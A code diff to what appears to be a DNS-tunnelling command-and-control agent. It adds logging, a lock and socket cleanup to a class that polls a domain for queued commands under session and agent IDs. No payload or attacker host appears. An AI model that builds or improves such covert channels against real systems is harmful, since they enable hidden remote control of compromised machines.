@@ -87,6 +87,10 @@ def _build_dns_query(domain: str, qtype: int = _QUERY_TYPE_TXT) -> bytes:
     for label in domain.split("."):
         encoded = label.encode("ascii")
         if len(encoded) > _MAX_LABEL_LENGTH:
+            logger.warning(
+                "DNS label exceeds %d bytes (%d), query may be malformed: %.20s...",
+                _MAX_LABEL_LENGTH, len(encoded), label,
+            )
             encoded = encoded[:_MAX_LABEL_LENGTH]
         qname += struct.pack("!B", len(encoded)) + encoded
     qname += b"\x00"  # root label
@@ -295,12 +299,14 @@ class DNSTunnel:
             return cmds
 
     def get_status(self) -> dict[str, Any]:
+        with self._lock:
+            pending = len(self._command_queue)
         return {
             "domain": self._domain,
             "session_id": self._session_id,
             "agent_id": self._agent_id,
             "polling": self._poll_thread is not None and self._poll_thread.is_alive(),
-            "pending_commands": len(self._command_queue),
+            "pending_commands": pending,
         }
 
     # ── Internal methods ─────────────────────────────────────────────
@@ -346,6 +352,7 @@ class DNSTunnel:
 
     def _send_dns_query(self, domain: str, qtype: int = _QUERY_TYPE_A) -> bool:
         """Send a raw DNS query to the nameserver."""
+        sock = None
         try:
             packet = _build_dns_query(domain, qtype)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -360,15 +367,18 @@ class DNSTunnel:
             except socket.timeout:
                 pass
 
-            sock.close()
             return True
 
         except Exception as exc:
             logger.debug("DNS query failed for %s: %s", domain, exc)
             return False
+        finally:
+            if sock is not None:
+                sock.close()
 
     def _query_txt(self, domain: str) -> list[str]:
         """Query DNS TXT records for a domain."""
+        sock = None
         try:
             packet = _build_dns_query(domain, _QUERY_TYPE_TXT)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -378,13 +388,14 @@ class DNSTunnel:
             sock.sendto(packet, (nameserver, _DNS_PORT))
 
             response, _ = sock.recvfrom(4096)
-            sock.close()
-
             return _parse_dns_response(response)
 
         except Exception as exc:
             logger.debug("DNS TXT query failed for %s: %s", domain, exc)
             return []
+        finally:
+            if sock is not None:
+                sock.close()
 
     def _poll_loop(self) -> None:
         """Background polling loop for commands."""
